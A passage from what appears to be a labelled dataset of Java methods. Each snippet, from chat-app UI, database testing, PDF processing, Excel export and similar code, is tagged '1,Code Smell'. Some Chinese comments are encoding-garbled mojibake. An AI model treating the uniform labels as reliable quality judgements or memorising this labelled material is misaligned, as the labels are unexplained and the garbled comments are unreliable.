          stack.visitBinaryOperator(resolver.resolve(input));
          continue;
        }
      }
 else {
        OpResolver<? extends UnaryOp> resolver=options.getUnaryOpResolver(c);
        if (resolver != null) {
          stack.visitUnaryOperator(resolver.resolve(input));
          continue;
        }
      }
      throw new UnexpectedCharacterException(c,input.getCurrentIndex());
    }
  }
  return stack.getFinal(input.getCurrentIndex());
}
",1,Code Smell
"@Override public boolean dispatchTouchEvent(MotionEvent ev){
  final int actionMasked=ev.getActionMasked() & MotionEvent.ACTION_MASK;
  if (actionMasked == MotionEvent.ACTION_DOWN) {
    touchDownY=ev.getY();
    if (bottomMenuListViewTouchEvent != null) {
      bottomMenuListViewTouchEvent.down(ev);
    }
    mPosition=pointToPosition((int)ev.getX(),(int)ev.getY());
    return super.dispatchTouchEvent(ev);
  }
  if (actionMasked == MotionEvent.ACTION_MOVE) {
    if (bottomMenuListViewTouchEvent != null) {
      bottomMenuListViewTouchEvent.move(ev);
    }
    if (Math.abs(touchDownY - ev.getY()) > dip2px(5)) {
      ev.setAction(MotionEvent.ACTION_CANCEL);
      dispatchTouchEvent(ev);
      return false;
    }
    return true;
  }
  if (actionMasked == MotionEvent.ACTION_UP || actionMasked == MotionEvent.ACTION_CANCEL) {
    if (bottomMenuListViewTouchEvent != null) {
      bottomMenuListViewTouchEvent.up(ev);
    }
    if (pointToPosition((int)ev.getX(),(int)ev.getY()) == mPosition) {
      super.dispatchTouchEvent(ev);
    }
 else {
      setPressed(false);
      invalidate();
    }
  }
  return super.dispatchTouchEvent(ev);
}",1,Code Smell
"public boolean unselect(Long documentId){
  selectedDocumentIds.remove(documentId);
  boolean found=false;
  if (emojiGridView != null) {
    for (int i=0; i < emojiGridView.getChildCount(); i++) {
      if (emojiGridView.getChildAt(i) instanceof ImageViewEmoji) {
        ImageViewEmoji imageViewEmoji=(ImageViewEmoji)emojiGridView.getChildAt(i);
        if (imageViewEmoji.span != null && imageViewEmoji.span.getDocumentId() == documentId) {
          imageViewEmoji.unselectWithScale();
          found=true;
        }
 else         if (imageViewEmoji.document != null && imageViewEmoji.document.id == documentId) {
          imageViewEmoji.unselectWithScale();
          found=true;
        }
      }
    }
    emojiGridView.invalidate();
    if (!found) {
      for (int i=0; i < rowHashCodes.size(); i++) {
        long hash=rowHashCodes.get(i);
        if (hash == 62425L + 13L * documentId || hash == 3212 + 13L * documentId) {
          if (adapter != null) {
            adapter.notifyItemChanged(i);
          }
          found=true;
          break;
        }
      }
    }
  }
  return found;
}",1,Code Smell
"public static CharSequence replaceEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,boolean createNew){
  return replaceEmoji(cs,fontMetrics,createNew,null);
}
public static CharSequence replaceEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,int size,boolean createNew){
  return replaceEmoji(cs,fontMetrics,createNew,null);
}
public static CharSequence replaceEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,boolean createNew,int[] emojiOnly){
  return replaceEmoji(cs,fontMetrics,createNew,emojiOnly,DynamicDrawableSpan.ALIGN_BOTTOM);
}
public static CharSequence replaceEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,boolean createNew,int[] emojiOnly,int alignment){
  if (cs == null || cs.length() == 0) {
    return cs;
  }
  Spannable s;
  if (!createNew && cs instanceof Spannable) {
    s=(Spannable)cs;
  }
 else {
    s=Spannable.Factory.getInstance().newSpannable(cs.toString());
  }
  ArrayList<EmojiSpanRange> emojis=parseEmojis(s,emojiOnly);
  if (emojis.isEmpty()) {
    return cs;
  }
  AnimatedEmojiSpan[] animatedEmojiSpans=s.getSpans(0,s.length(),AnimatedEmojiSpan.class);
  EmojiSpan span;
  Drawable drawable;
  int limitCount=SharedConfig.getDevicePerformanceClass() >= SharedConfig.PERFORMANCE_CLASS_HIGH ? 100 : 50;
  for (int i=0; i < emojis.size(); ++i) {
    try {
      EmojiSpanRange emojiRange=emojis.get(i);
      if (animatedEmojiSpans != null) {
        boolean hasAnimated=false;
        for (int j=0; j < animatedEmojiSpans.length; ++j) {
          AnimatedEmojiSpan animatedSpan=animatedEmojiSpans[j];
          if (animatedSpan != null && s.getSpanStart(animatedSpan) == emojiRange.start && s.getSpanEnd(animatedSpan) == emojiRange.end) {
            hasAnimated=true;
            break;
          }
        }
        if (hasAnimated) {
          continue;
        }
      }
      drawable=Emoji.getEmojiDrawable(emojiRange.code);
      if (drawable != null) {
        span=new EmojiSpan(drawable,alignment,fontMetrics);
        span.emoji=emojiRange.code == null ? null : emojiRange.code.toString();
        s.setSpan(span,emojiRange.start,emojiRange.end,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
    if (!NaConfig.INSTANCE.getDisableEmojiDrawLimit().Bool()) {
      if ((Build.VERSION.SDK_INT < 23 || Build.VERSION.SDK_INT >= 29) && (i + 1) >= limitCount) {
        break;
      }
    }
  }
  return s;
}",1,Code Smell
"private void testMongoDBSnapshotSplitReader(SplitStrategy splitter) throws Exception {
  LinkedList<SnapshotSplit> snapshotSplits=new LinkedList<>(splitter.split(splitContext));
  assertTrue(snapshotSplits.size() > 0);
  IncrementalSourceReaderContext incrementalSourceReaderContext=new IncrementalSourceReaderContext(new TestingReaderContext());
  IncrementalSourceSplitReader<MongoDBSourceConfig> snapshotSplitReader=new IncrementalSourceSplitReader<>(0,dialect,sourceConfig,incrementalSourceReaderContext,SnapshotPhaseHooks.empty());
  int retry=0;
  long actualCount=0;
  try {
    while (retry < MAX_RETRY_TIMES) {
      if (!snapshotSplits.isEmpty() && snapshotSplitReader.canAssignNextSplit()) {
        SnapshotSplit snapshotSplit=snapshotSplits.poll();
        LOG.info(""Add snapshot split {}"",snapshotSplit.splitId());
        snapshotSplitReader.handleSplitsChanges(new SplitsAddition<>(singletonList(snapshotSplit)));
      }
      ChangeEventRecords records=(ChangeEventRecords)snapshotSplitReader.fetch();
      if (records.nextSplit() != null) {
        SourceRecords sourceRecords;
        while ((sourceRecords=records.nextRecordFromSplit()) != null) {
          Iterator<SourceRecord> iterator=sourceRecords.iterator();
          while (iterator.hasNext()) {
            SourceRecord record=iterator.next();
            if (!isWatermarkEvent(record)) {
              Struct value=(Struct)record.value();
              BsonDocument fullDocument=BsonDocument.parse(value.getString(FULL_DOCUMENT_FIELD));
              long productNo=fullDocument.getInt64(""product_no"").longValue();
              String productKind=fullDocument.getString(""product_kind"").getValue();
              String userId=fullDocument.getString(""user_id"").getValue();
              String description=fullDocument.getString(""description"").getValue();
              assertEquals(""KIND_"" + productNo,productKind);
              assertEquals(""user_"" + productNo,userId);
              assertEquals(""my shopping cart "" + productNo,description);
              actualCount++;
            }
          }
        }
      }
 else       if (snapshotSplits.isEmpty() && snapshotSplitReader.canAssignNextSplit()) {
        break;
      }
      Thread.sleep(300);
      retry++;
    }
  }
  finally {
    snapshotSplitReader.close();
  }
  assertEquals(splitContext.getDocumentCount(),actualCount);
}",1,Code Smell
"/** 
 * Extracts the provenance information from the supplied map, splitting it into configuration and instance information.
 * @param map The provenance map.
 * @return The provenance information.
 */
protected static ExtractedInfo extractProvenanceInfo(Map<String,Provenance> map){
  String className;
  String hostTypeStringName;
  Map<String,Provenance> configuredParameters=new HashMap<>(map);
  Map<String,PrimitiveProvenance<?>> instanceValues=new HashMap<>();
  if (configuredParameters.containsKey(ObjectProvenance.CLASS_NAME)) {
    className=configuredParameters.remove(ObjectProvenance.CLASS_NAME).toString();
  }
 else {
    throw new ProvenanceException(""Failed to find class name when constructing SkeletalTrainerProvenance"");
  }
  if (configuredParameters.containsKey(SkeletalConfiguredObjectProvenance.HOST_SHORT_NAME)) {
    hostTypeStringName=configuredParameters.remove(SkeletalConfiguredObjectProvenance.HOST_SHORT_NAME).toString();
  }
 else {
    throw new ProvenanceException(""Failed to find host type short name when constructing SkeletalTrainerProvenance"");
  }
  if (configuredParameters.containsKey(TrainerProvenance.TRAIN_INVOCATION_COUNT)) {
    Provenance tmpProv=configuredParameters.remove(TrainerProvenance.TRAIN_INVOCATION_COUNT);
    if (tmpProv instanceof IntProvenance) {
      instanceValues.put(TRAIN_INVOCATION_COUNT,(IntProvenance)tmpProv);
    }
 else {
      throw new ProvenanceException(TRAIN_INVOCATION_COUNT + "" was not of type IntProvenance in class "" + className);
    }
  }
 else {
    throw new ProvenanceException(""Failed to find invocation count when constructing SkeletalTrainerProvenance"");
  }
  if (configuredParameters.containsKey(TrainerProvenance.IS_SEQUENCE)) {
    Provenance tmpProv=configuredParameters.remove(TrainerProvenance.IS_SEQUENCE);
    if (tmpProv instanceof BooleanProvenance) {
      instanceValues.put(IS_SEQUENCE,(BooleanProvenance)tmpProv);
    }
 else {
      throw new ProvenanceException(IS_SEQUENCE + "" was not of type BooleanProvenance in class "" + className);
    }
  }
 else {
    throw new ProvenanceException(""Failed to find is-sequence when constructing SkeletalTrainerProvenance"");
  }
  if (configuredParameters.containsKey(TrainerProvenance.TRIBUO_VERSION_STRING)) {
    Provenance tmpProv=configuredParameters.remove(TrainerProvenance.TRIBUO_VERSION_STRING);
    if (tmpProv instanceof StringProvenance) {
      instanceValues.put(TRIBUO_VERSION_STRING,(StringProvenance)tmpProv);
    }
 else {
      throw new ProvenanceException(TRIBUO_VERSION_STRING + "" was not of type StringProvenance in class "" + className);
    }
  }
 else {
    throw new ProvenanceException(""Failed to find Tribuo version when constructing SkeletalTrainerProvenance"");
  }
  return new ExtractedInfo(className,hostTypeStringName,configuredParameters,instanceValues);
}
",1,Code Smell
"public static String formatUserStatus(int currentAccount,TLRPC.User user){
  return formatUserStatus(currentAccount,user,null);
}
public static String formatUserStatus(int currentAccount,TLRPC.User user,boolean[] isOnline){
  return formatUserStatus(currentAccount,user,isOnline,null);
}
public static String formatUserStatus(int currentAccount,TLRPC.User user,boolean[] isOnline,boolean[] madeShorter){
  if (user != null && user.status != null && user.status.expires == 0) {
    if (user.status instanceof TLRPC.TL_userStatusRecently) {
      user.status.expires=-100;
    }
 else     if (user.status instanceof TLRPC.TL_userStatusLastWeek) {
      user.status.expires=-101;
    }
 else     if (user.status instanceof TLRPC.TL_userStatusLastMonth) {
      user.status.expires=-102;
    }
  }
  if (user != null && user.status != null && user.status.expires <= 0) {
    if (MessagesController.getInstance(currentAccount).onlinePrivacy.containsKey(user.id)) {
      if (isOnline != null) {
        isOnline[0]=true;
      }
      return getString(""Online"",R.string.Online);
    }
  }
  if (user == null || user.status == null || user.status.expires == 0 || UserObject.isDeleted(user) || user instanceof TLRPC.TL_userEmpty) {
    return getString(""ALongTimeAgo"",R.string.ALongTimeAgo);
  }
 else {
    int currentTime=ConnectionsManager.getInstance(currentAccount).getCurrentTime();
    if (user.status.expires > currentTime) {
      if (isOnline != null) {
        isOnline[0]=true;
      }
      return getString(""Online"",R.string.Online);
    }
 else {
      if (user.status.expires == -1) {
        return getString(""Invisible"",R.string.Invisible);
      }
 else       if (user.status.expires == -100) {
        return getString(""Lately"",R.string.Lately);
      }
 else       if (user.status.expires == -101) {
        return getString(""WithinAWeek"",R.string.WithinAWeek);
      }
 else       if (user.status.expires == -102) {
        return getString(""WithinAMonth"",R.string.WithinAMonth);
      }
 else {
        return formatDateOnline(user.status.expires,madeShorter);
      }
    }
  }
}",1,Code Smell
"@PostMapping(consumes=""multipart/form-data"",value=""/extract-images"") @Operation(summary=""Extract images from a PDF file"",description=""This endpoint extracts images from a given PDF file and returns them in a zip file. Users can specify the output image format. Input:PDF Output:IMAGE/ZIP Type:SIMO"") public ResponseEntity<byte[]> extractImages(@ModelAttribute PDFWithImageFormatRequest request) throws IOException {
  MultipartFile file=request.getFileInput();
  String format=request.getFormat();
  System.out.println(System.currentTimeMillis() + ""file="" + file.getName()+ "", format=""+ format);
  PDDocument document=Loader.loadPDF(file.getBytes());
  ByteArrayOutputStream baos=new ByteArrayOutputStream();
  ZipOutputStream zos=new ZipOutputStream(baos);
  zos.setLevel(Deflater.BEST_COMPRESSION);
  int imageIndex=1;
  String filename=Filenames.toSimpleFileName(file.getOriginalFilename()).replaceFirst(""[.][^.]+$"","""");
  int pageNum=0;
  Set<Integer> processedImages=new HashSet<>();
  for (  PDPage page : document.getPages()) {
    ++pageNum;
    for (    COSName name : page.getResources().getXObjectNames()) {
      if (page.getResources().isImageXObject(name)) {
        PDImageXObject image=(PDImageXObject)page.getResources().getXObject(name);
        int imageHash=image.hashCode();
        if (processedImages.contains(imageHash)) {
          continue;
        }
        processedImages.add(imageHash);
        RenderedImage renderedImage=image.getImage();
        BufferedImage bufferedImage=null;
        if (""png"".equalsIgnoreCase(format)) {
          bufferedImage=new BufferedImage(renderedImage.getWidth(),renderedImage.getHeight(),BufferedImage.TYPE_INT_ARGB);
        }
 else         if (""jpeg"".equalsIgnoreCase(format) || ""jpg"".equalsIgnoreCase(format)) {
          bufferedImage=new BufferedImage(renderedImage.getWidth(),renderedImage.getHeight(),BufferedImage.TYPE_INT_RGB);
        }
 else         if (""gif"".equalsIgnoreCase(format)) {
          bufferedImage=new BufferedImage(renderedImage.getWidth(),renderedImage.getHeight(),BufferedImage.TYPE_BYTE_INDEXED);
        }
        String imageName=filename + ""_"" + imageIndex+ "" (Page ""+ pageNum+ "").""+ format;
        ZipEntry zipEntry=new ZipEntry(imageName);
        zos.putNextEntry(zipEntry);
        Graphics2D g=bufferedImage.createGraphics();
        g.drawImage((Image)renderedImage,0,0,null);
        g.dispose();
        ByteArrayOutputStream imageBaos=new ByteArrayOutputStream();
        ImageIO.write(bufferedImage,format,imageBaos);
        zos.write(imageBaos.toByteArray());
        zos.closeEntry();
        imageIndex++;
      }
    }
  }
  zos.close();
  document.close();
  byte[] zipContents=baos.toByteArray();
  return WebResponseUtils.boasToWebResponse(baos,filename + ""_extracted-images.zip"",MediaType.APPLICATION_OCTET_STREAM);
}",1,Code Smell
"public boolean compareForRole(Set<String> formValues,String[] value){
  if (formValues == null || formValues.size() <= 0) {
    return false;
  }
  Iterator<String> iterator=formValues.iterator();
  while (iterator.hasNext()) {
    String next=iterator.next();
    EruptUser account=eruptUserRepository.findByAccount(next);
    boolean found=false;
    for (int i=0; i < value.length; i++) {
      if (account.getRoles() != null) {
        for (        EruptRole role : account.getRoles()) {
          if (role.getCode().equals(JSON.parseObject(value[i]).getString(""id""))) {
            found=true;
            break;
          }
        }
      }
    }
    if (!found) {
      return false;
    }
  }
  return true;
}",1,Code Smell
"/** 
 * 鎷疯礉鏂囦欢銆�
 * @param from 鏂囦欢銆佺洰褰�
 * @param to 鏂囦欢銆佺洰褰曪紝涓嶅瓨鍦ㄦ椂浼氳嚜鍔ㄥ垱寤�
 * @throws IOException
 */
public static File copy(File from,File to) throws IOException {
  return copy(from,to,null);
}
/** 
 * 鎷疯礉鏂囦欢銆�
 * @param from 鏂囦欢銆佺洰褰�
 * @param to 鏂囦欢銆佺洰褰曪紝涓嶅瓨鍦ㄦ椂浼氳嚜鍔ㄥ垱寤�
 * @param filter 鍏佽涓簕@code null}锛屼粎鎷疯礉鎺ュ彈鐨勬枃浠�
 * @return 鐩爣鏂囦欢锛寋@code null}琛ㄧず娌℃湁鎷疯礉浠讳綍鏂囦欢
 * @throws IOException
 */
public static File copy(File from,File to,CopyFileFilter filter) throws IOException {
  if (filter != null && !filter.accept(from,to))   return null;
  if (from.isDirectory()) {
    if (!to.exists())     to.mkdirs();
    if (!to.isDirectory())     throw new IllegalArgumentException(""["" + to + ""] must be directory"");
    File[] children=from.listFiles();
    if (children != null) {
      for (      File child : children)       copy(child,FileUtil.getFile(to,child.getName()),filter);
    }
    return to;
  }
 else {
    if (to.exists() && to.isDirectory())     FileUtil.deleteFile(to);
    OutputStream out=null;
    try {
      out=IOUtil.getOutputStream(to);
      IOUtil.write(from,out);
    }
  finally {
      IOUtil.close(out);
    }
    return to;
  }
}
",1,Code Smell
"private void repBrokerTopicInfo(int brokerId,Map<String,TopicInfo> topicInfoMap){
  if (topicInfoMap == null || topicInfoMap.isEmpty()) {
    return;
  }
  ConcurrentHashMap<Integer,TopicInfo> newTopicInfoView;
  ConcurrentHashMap<Integer,TopicInfo> curTopicInfoView;
  for (  TopicInfo topicInfo : topicInfoMap.values()) {
    if (topicInfo == null) {
      continue;
    }
    curTopicInfoView=topicConfInfoMap.get(topicInfo.getTopic());
    if (curTopicInfoView == null) {
      newTopicInfoView=new ConcurrentHashMap<>();
      curTopicInfoView=topicConfInfoMap.putIfAbsent(topicInfo.getTopic(),newTopicInfoView);
      if (curTopicInfoView == null) {
        curTopicInfoView=newTopicInfoView;
      }
    }
    curTopicInfoView.put(brokerId,topicInfo.clone());
  }
  ConcurrentHashSet<String> curTopicSet=brokerIdIndexMap.get(brokerId);
  if (curTopicSet == null) {
    ConcurrentHashSet<String> newTopicSet=new ConcurrentHashSet<>();
    curTopicSet=brokerIdIndexMap.putIfAbsent(brokerId,newTopicSet);
    if (curTopicSet == null) {
      curTopicSet=newTopicSet;
    }
  }
  curTopicSet.addAll(topicInfoMap.keySet());
}
",1,Code Smell
"/** 
 * Deprecated: Load Berkeley DB store section config Just keep `loadReplicationSectConf` for backward compatibility
 * @param iniConf  the master ini object
 * @return   the configured information
 */
private BdbMetaConfig loadReplicationSectConf(final Ini iniConf){
  final Profile.Section repSect=iniConf.get(SECT_TOKEN_REPLICATION);
  if (repSect == null) {
    return null;
  }
  Set<String> configKeySet=repSect.keySet();
  if (configKeySet.isEmpty()) {
    throw new IllegalArgumentException(new StringBuilder(256).append(""Empty configure item in "").append(SECT_TOKEN_REPLICATION).append("" section!"").toString());
  }
  BdbMetaConfig tmpMetaConfig=new BdbMetaConfig();
  logger.warn(""[replication] section is deprecated. Please config in [meta_bdb] section."");
  if (TStringUtils.isNotBlank(repSect.get(""repGroupName""))) {
    tmpMetaConfig.setRepGroupName(repSect.get(""repGroupName"").trim());
  }
  if (TStringUtils.isBlank(repSect.get(""repNodeName""))) {
    getSimilarConfigField(SECT_TOKEN_REPLICATION,configKeySet,""repNodeName"");
  }
 else {
    tmpMetaConfig.setRepNodeName(repSect.get(""repNodeName"").trim());
  }
  if (TStringUtils.isNotBlank(repSect.get(""repNodePort""))) {
    tmpMetaConfig.setRepNodePort(getInt(repSect,""repNodePort""));
  }
  final Profile.Section masterConf=iniConf.get(SECT_TOKEN_MASTER);
  if (TStringUtils.isNotBlank(masterConf.get(""metaDataPath""))) {
    tmpMetaConfig.setMetaDataPath(masterConf.get(""metaDataPath"").trim());
  }
  if (TStringUtils.isNotBlank(repSect.get(""repHelperHost""))) {
    tmpMetaConfig.setRepHelperHost(repSect.get(""repHelperHost"").trim());
  }
  if (TStringUtils.isNotBlank(repSect.get(""metaLocalSyncPolicy""))) {
    tmpMetaConfig.setMetaLocalSyncPolicy(getInt(repSect,""metaLocalSyncPolicy""));
  }
  if (TStringUtils.isNotBlank(repSect.get(""metaReplicaSyncPolicy""))) {
    tmpMetaConfig.setMetaReplicaSyncPolicy(getInt(repSect,""metaReplicaSyncPolicy""));
  }
  if (TStringUtils.isNotBlank(repSect.get(""repReplicaAckPolicy""))) {
    tmpMetaConfig.setRepReplicaAckPolicy(getInt(repSect,""repReplicaAckPolicy""));
  }
  if (TStringUtils.isNotBlank(repSect.get(""repStatusCheckTimeoutMs""))) {
    tmpMetaConfig.setRepStatusCheckTimeoutMs(getLong(repSect,""repStatusCheckTimeoutMs""));
  }
  return tmpMetaConfig;
}",1,Code Smell
"private WebserverAPI getAPIThatMatchesPath(HttpServletRequest req){
  String requestPath=req.getServletPath().toLowerCase();
  for (  WebserverAPI api : this.apis) {
    String apiPath=api.getPath().toLowerCase();
    if (!apiPath.startsWith(""/"")) {
      apiPath=""/"" + apiPath;
    }
    if (requestPath.equals(apiPath) || requestPath.equals(apiPath + ""/"")) {
      return api;
    }
  }
  for (  WebserverAPI api : this.apis) {
    String apiPath=api.getPath().toLowerCase();
    if (!apiPath.startsWith(""/"")) {
      apiPath=""/"" + apiPath;
    }
    String tenantIdStopWords=String.join(""|"",Utils.INVALID_WORDS_FOR_TENANTID);
    if (requestPath.matches(""^(/appid-[a-z0-9-]*)?(/(?!"" + tenantIdStopWords + "")[a-z0-9-]+)?""+ apiPath+ ""/?$"")) {
      return api;
    }
  }
  for (  WebserverAPI api : this.apis) {
    if (api.getPath().equals(""/"")) {
      return api;
    }
  }
  throw new RuntimeException(""Should never come here"");
}",1,Code Smell
"/** 
 * 濉厖excel鏁版嵁
 * @param index 搴忓彿
 * @param row 鍗曞厓鏍艰
 */
@SuppressWarnings(""unchecked"") public void fillExcelData(int index,Row row){
  int startNo=index * sheetSize;
  int endNo=Math.min(startNo + sheetSize,list.size());
  int rowNo=(1 + rownum) - startNo;
  for (int i=startNo; i < endNo; i++) {
    rowNo=isSubList() ? (i > 1 ? rowNo + 1 : rowNo + i) : i + 1 + rownum - startNo;
    row=sheet.createRow(rowNo);
    T vo=(T)list.get(i);
    Collection<?> subList=null;
    if (isSubList()) {
      if (isSubListValue(vo)) {
        subList=getListCellValue(vo);
        subMergedLastRowNum=subMergedLastRowNum + subList.size();
      }
 else {
        subMergedFirstRowNum++;
        subMergedLastRowNum++;
      }
    }
    int column=0;
    for (    Object[] os : fields) {
      Field field=(Field)os[0];
      Excel excel=(Excel)os[1];
      if (Collection.class.isAssignableFrom(field.getType()) && StringUtils.isNotNull(subList)) {
        boolean subFirst=false;
        for (        Object obj : subList) {
          if (subFirst) {
            rowNo++;
            row=sheet.createRow(rowNo);
          }
          List<Field> subFields=FieldUtils.getFieldsListWithAnnotation(obj.getClass(),Excel.class);
          int subIndex=0;
          for (          Field subField : subFields) {
            if (subField.isAnnotationPresent(Excel.class)) {
              subField.setAccessible(true);
              Excel attr=subField.getAnnotation(Excel.class);
              this.addCell(attr,row,(T)obj,subField,column + subIndex);
            }
            subIndex++;
          }
          subFirst=true;
        }
        this.subMergedFirstRowNum=this.subMergedFirstRowNum + subList.size();
      }
 else {
        this.addCell(excel,row,vo,field,column++);
      }
    }
  }
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public UserModel insert(UserModel model){
  if (model == null) {
    return null;
  }
  if (StringUtils.isNotEmpty(model.getTenantId())) {
    if (!UserUtil.isHasUpdateTenantPerms(UserUtil.getUser())) {
      model.setTenantId(null);
      model.setIzTenantAdmin(null);
      model.setEnableSwitchTenant(DictType.NO_YES_NO.getValue());
    }
  }
  boolean verificationByName=this.uniqueVerificationByName(model);
  if (!verificationByName) {
    throw new ServiceException(SystemMsg.EXCEPTION_USER_UNIQUE);
  }
  boolean verificationByNo=this.uniqueVerificationByNo(model);
  if (!verificationByNo) {
    throw new ServiceException(SystemMsg.EXCEPTION_USER_NO_UNIQUE);
  }
  model.setLoginIp(null);
  model.setEnable(DictType.NO_YES_YES.getValue());
  model.setIzExistOrg(DictType.NO_YES_NO.getValue());
  if (StringUtils.isNotEmpty(model.getPassword())) {
    model.setPasswordLevel(CheckStrength.getPasswordLevel(model.getPassword()).getCode());
    model.setPassword(PasswordUtil.encode(passwordEncoder,model.getPassword()));
  }
  if (StringUtils.isNotEmpty(model.getMobile())) {
    LambdaUpdateWrapper<SysUser> updateWrapper=new LambdaUpdateWrapper<>();
    updateWrapper.set(SysUser::getMobile,null);
    updateWrapper.eq(SysUser::getMobile,model.getMobile());
    this.update(updateWrapper);
  }
  if (StringUtils.isNotEmpty(model.getEmail())) {
    LambdaUpdateWrapper<SysUser> updateWrapper=new LambdaUpdateWrapper<>();
    updateWrapper.set(SysUser::getEmail,null);
    updateWrapper.eq(SysUser::getEmail,model.getEmail());
    this.update(updateWrapper);
  }
  UserModel insertModel=super.insert(model);
  if (insertModel != null) {
    String defRole=null;
    OptionsModel optionsModel=OptionsUtil.getOptionByCode(""def_role"");
    if (optionsModel != null) {
      defRole=optionsModel.getOptionValue();
    }
    if (StringUtils.isNotBlank(defRole)) {
      LambdaUpdateWrapper<SysRole> roleQueryWrapper=new LambdaUpdateWrapper<>();
      roleQueryWrapper.eq(SysRole::getRoleCode,defRole);
      roleQueryWrapper.eq(SysRole::getDeleted,DictType.NO_YES_NO.getValue());
      SysRole sysRole=iRoleService.getOne(roleQueryWrapper);
      if (sysRole != null) {
        UserRoleRefModel userRoleRefModel=UserRoleRefModel.builder().userId(insertModel.getId()).roleIds(Convert.toStrArray(sysRole.getId())).defRoleId(sysRole.getId()).build();
        iUserRoleRefService.setRoles(userRoleRefModel);
      }
    }
  }
  return insertModel;
}
",1,Code Smell
"private static void roadmap(){
  String s=AntStallRpcCall.roadmap();
  try {
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      JSONObject userInfo=jo.getJSONObject(""userInfo"");
      JSONObject currentCoin=userInfo.getJSONObject(""currentCoin"");
      int amount=(int)currentCoin.getDouble(""amount"");
      if (amount < 15000) {
        return;
      }
      JSONArray roadList=jo.getJSONArray(""roadList"");
      boolean unFinished=false;
      boolean canNext=false;
      for (int i=0; i < roadList.length(); i++) {
        JSONObject road=roadList.getJSONObject(i);
        if (""FINISHED"".equals(road.getString(""status""))) {
          continue;
        }
        if (""LOCK"".equals(road.getString(""status""))) {
          canNext=true;
          break;
        }
        if (road.getInt(""donateCount"") < road.getInt(""donateLimit"")) {
          unFinished=true;
        }
      }
      if (unFinished) {
        donate();
      }
 else       if (canNext) {
        s=AntStallRpcCall.nextVillage();
        jo=new JSONObject(s);
        if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
          Log.farm(""铓傝殎鏂版潙鉀繘鍏ヤ笅涓�鏉戞垚鍔�"");
        }
      }
    }
 else {
      Log.recordLog(""roadmap err:"",s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""roadmap err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"/** 
 * restore metric state data
 * @param metricStateListState state data list
 * @param subtaskIndex current subtask index
 * @param currentSubtaskNum number of current parallel subtask
 * @return metric state
 * @throws Exception throw exception metricStateListState.get()
 */
public static MetricState restoreMetricState(ListState<MetricState> metricStateListState,Integer subtaskIndex,Integer currentSubtaskNum) throws Exception {
  if (metricStateListState == null || metricStateListState.get() == null) {
    return null;
  }
  LOGGER.info(""restoreMetricState:{}, subtaskIndex:{}, currentSubtaskNum:{}"",metricStateListState,subtaskIndex,currentSubtaskNum);
  MetricState currentMetricState;
  Map<Integer,MetricState> map=new HashMap<>(16);
  for (  MetricState metricState : metricStateListState.get()) {
    map.put(metricState.getSubtaskIndex(),metricState);
  }
  int previousSubtaskNum=map.size();
  if (currentSubtaskNum >= previousSubtaskNum) {
    currentMetricState=map.get(subtaskIndex);
  }
 else {
    Map<String,MetricState> subMetricStateMap=new HashMap<>();
    Map<String,Long> metrics=new HashMap<>(16);
    currentMetricState=new MetricState(subtaskIndex,metrics);
    currentMetricState.setSubMetricStateMap(subMetricStateMap);
    List<Integer> indexList=computeIndexList(subtaskIndex,currentSubtaskNum,previousSubtaskNum);
    for (    Integer index : indexList) {
      MetricState metricState=map.get(index);
      for (      Map.Entry<String,Long> entry : metricState.getMetrics().entrySet()) {
        if (metrics.containsKey(entry.getKey())) {
          metrics.put(entry.getKey(),metrics.get(entry.getKey()) + entry.getValue());
        }
 else {
          metrics.put(entry.getKey(),entry.getValue());
        }
      }
      Map<String,MetricState> subIndexMetricStateMap=metricState.getSubMetricStateMap();
      if (subIndexMetricStateMap != null && !subIndexMetricStateMap.isEmpty()) {
        for (        Entry<String,MetricState> entry : subIndexMetricStateMap.entrySet()) {
          MetricState subMetricState;
          if (subMetricStateMap.containsKey(entry.getKey())) {
            subMetricState=subMetricStateMap.get(entry.getKey());
            Map<String,Long> subMetrics=subMetricState.getMetrics();
            Map<String,Long> currentSubMetrics=entry.getValue().getMetrics();
            for (            Entry<String,Long> currentSubEntry : currentSubMetrics.entrySet()) {
              if (subMetrics.containsKey(currentSubEntry.getKey())) {
                subMetrics.put(currentSubEntry.getKey(),subMetrics.get(currentSubEntry.getKey()) + currentSubEntry.getValue());
              }
 else {
                subMetrics.put(currentSubEntry.getKey(),currentSubEntry.getValue());
              }
            }
          }
 else {
            subMetricState=entry.getValue();
            subMetricState.setSubtaskIndex(subtaskIndex);
          }
          subMetricStateMap.put(entry.getKey(),subMetricState);
        }
      }
    }
  }
  return currentMetricState;
}",1,Code Smell
"private void setSlideTransitionProgress(float progress){
  if (SharedConfig.getDevicePerformanceClass() <= SharedConfig.PERFORMANCE_CLASS_LOW || slideFragmentProgress == progress) {
    return;
  }
  slideFragmentLite=SharedConfig.getDevicePerformanceClass() <= SharedConfig.PERFORMANCE_CLASS_AVERAGE || !LiteMode.isEnabled(LiteMode.FLAG_CHAT_SCALE);
  slideFragmentProgress=progress;
  if (fragmentView != null) {
    fragmentView.invalidate();
  }
  if (slideFragmentLite) {
    if (filterTabsView != null) {
      filterTabsView.getListView().setTranslationX((isDrawerTransition ? 1 : -1) * dp(slideAmplitudeDp) * (1f - slideFragmentProgress));
      filterTabsView.invalidate();
    }
    if (dialogStoriesCell != null) {
      dialogStoriesCell.setTranslationX((isDrawerTransition ? 1 : -1) * dp(slideAmplitudeDp) * (1f - slideFragmentProgress));
    }
    if (rightSlidingDialogContainer != null && rightSlidingDialogContainer.getFragmentView() != null) {
      if (!rightFragmentTransitionInProgress) {
        rightSlidingDialogContainer.getFragmentView().setTranslationX((isDrawerTransition ? 1 : -1) * dp(slideAmplitudeDp) * (1f - slideFragmentProgress));
      }
    }
  }
 else {
    final float s=1f - 0.05f * (1f - slideFragmentProgress);
    if (filterTabsView != null) {
      filterTabsView.getListView().setScaleX(s);
      filterTabsView.getListView().setScaleY(s);
      filterTabsView.getListView().setTranslationX((isDrawerTransition ? dp(4) : -dp(4)) * (1f - slideFragmentProgress));
